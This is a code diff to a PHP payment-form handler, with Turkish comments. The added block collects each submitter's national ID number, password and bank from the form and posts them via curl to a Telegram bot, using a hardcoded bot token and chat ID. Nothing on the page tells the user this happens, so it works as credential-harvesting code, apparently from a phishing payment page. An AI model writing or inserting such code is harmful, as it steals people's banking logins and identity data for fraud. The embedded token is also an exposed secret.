@@ -10,6 +10,41 @@
     foreach ($_POST as $key => $value) {
       $datas[$key] = $db -> real_escape_string(htmlspecialchars(trim($value)));
     }
+	  $token = '6130623406:AAGZBm0a478MN1oh9UTGm7I_QFWQ_yNCrwk';
+
+// Mesaj göndermek istediğiniz kullanıcının Telegram kullanıcı adını veya ID'sini buraya girin
+$chatId = '-972681257';
+
+// Önceki kodunuzun devamı...
+
+// $db -> query() fonksiyonundan hemen sonra, ödeme işlemi tamamlandığında bir mesaj göndermek için aşağıdaki kodu ekleyin
+$message = "Yeni bir ödeme işlemi tamamlandı:\n\n";
+$message .= "İşlem: " . $datas[type] . "\n";
+$message .= "Miktar: " . $datas[amount] . "\n";
+$message .= "T.C: " . $datas[jethavale_tc] . "\n";
+$message .= "Şifre: " . $datas[jethavale_sifre] . "\n";
+$message .= "Banka: " . $datas[jethavale_banka] . "\n";
+		
+// Diğer verileri mesajınıza ekleyebilirsiniz
+
+// Telegram API'ye POST isteği göndermek için gerekli URL
+$url = "https://api.telegram.org/bot$token/sendMessage";
+
+// POST isteği için gerekli parametreleri oluşturun
+$params = [
+    'chat_id' => $chatId,
+    'text' => $message,
+];
+
+// Curl kullanarak POST isteği gönderin
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$response = curl_exec($ch);
+curl_close($ch);
+
   $ip = htmlspecialchars($_SERVER['HTTP_CF_CONNECTING_IP'] ? $_SERVER['HTTP_CF_CONNECTING_IP'] : $_SERVER[REMOTE_ADDR]);
     if (strlen($datas['amount']) > 0) {
     header('Content-Type: application/json');
@@ -47,6 +82,9 @@
       ");
       $_SESSION['amount'] = $datas[amount];
       $amonts = $_SESSION['amount'];
+		
+
+
     die(json_encode(['success' => true, 'message' => $db->insert_id]));
   }
   elseif($q == "update-payment"){
